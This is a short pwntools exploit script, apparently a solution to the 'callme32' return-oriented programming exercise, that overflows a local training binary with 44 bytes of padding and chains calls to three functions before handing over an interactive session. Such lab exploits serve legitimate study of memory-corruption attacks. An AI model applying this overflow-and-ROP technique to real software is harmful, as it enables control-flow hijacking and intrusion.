import os
from pwn import *

e = ELF('./callme32')
rop = ROP(e)

payload = 'A'*44        # offset
rop.callme_one(1,2,3)   # call fun1 with args
rop.callme_two(1,2,3)   # call fun2 with args
rop.callme_three(1,2,3) # call fun3 with args

payload += str(rop)

r = process(e.path)
r.recvuntil('>')
r.sendline(payload)
r.interactive()
